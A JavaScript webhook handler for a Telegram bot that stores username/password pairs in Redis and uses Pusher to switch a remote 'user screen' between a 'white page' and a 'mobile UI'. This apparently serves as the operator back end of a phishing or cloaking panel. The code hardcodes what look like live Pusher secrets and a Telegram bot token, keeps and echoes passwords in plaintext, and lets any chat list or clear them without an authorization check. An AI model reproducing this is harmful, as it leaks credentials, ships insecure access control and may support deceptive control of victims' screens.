const Pusher = require('pusher');
const { Redis } = require('@upstash/redis');

const pusher = new Pusher({
    appId: process.env.PUSHER_APP_ID || '2149356',
    key: process.env.PUSHER_KEY || '5628e828c0ecf46c7de1',
    secret: process.env.PUSHER_SECRET || 'c3f522d273a4f329faa3',
    cluster: process.env.PUSHER_CLUSTER || 'ap1',
    useTLS: true
});

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
    const body = req.body;
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';

    // Handle Commands
    if (body.message && body.message.text) {
        const text = body.message.text;
        const chatId = body.message.chat.id;

        // /add_user command
        if (text.startsWith('/add_user')) {
            const parts = text.split(' ');
            if (parts.length === 3) {
                const u = parts[1];
                const p = parts[2];
                await redis.hset('users', { [u]: p });
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `✅ *USER ADDED*\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\`\n\nDatabase sync complete.`,
                        parse_mode: 'Markdown'
                    })
                });
            }
            return res.status(200).send('OK');
        }

        // /list_users command
        if (text === '/list_users') {
            const allUsers = await redis.hgetall('users');
            let list = '👥 *CURRENT USERS LIST:*\n\n';
            
            if (!allUsers || Object.keys(allUsers).length === 0) {
                list += '_No users added yet._';
            } else {
                for (const [u, p] of Object.entries(allUsers)) {
                    list += `👤 \`${u}\` : \`${p}\`\n`;
                }
            }

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: list,
                    parse_mode: 'Markdown'
                })
            });
            return res.status(200).send('OK');
        }

        // /clear_users command
        if (text === '/clear_users') {
            await redis.del('users');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `🗑️ *USER LIST CLEARED*`,
                    parse_mode: 'Markdown'
                })
            });
            return res.status(200).send('OK');
        }
    }

    if (body.callback_query) {
        const action = body.callback_query.data; // e.g., 'state_white_page'
        const chatId = body.callback_query.message.chat.id;
        const messageId = body.callback_query.message.message_id;

        let screenState = '';
        let statusText = '';

        if (action === 'state_white_page') {
            screenState = 'white_page';
            statusText = '⚪ USER SCREEN: WHITE PAGE';
        } else if (action === 'state_mobile_ui') {
            screenState = 'mobile_ui';
            statusText = '📱 USER SCREEN: MOBILE UI';
        }

        // Trigger Pusher Event
        await pusher.trigger('admin-channel', 'screen-change', {
            state: screenState
        });

        // Update Telegram Message to show current status
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;

        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: `${body.callback_query.message.text}\n\n✅ *CURRENT STATUS:* ${statusText}`,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '⚪ Set White Page', callback_data: 'state_white_page' },
                            { text: '📱 Set Mobile UI', callback_data: 'state_mobile_ui' }
                        ]
                    ]
                }
            })
        });

        return res.status(200).send('OK');
    }

    return res.status(200).send('No callback query');
}
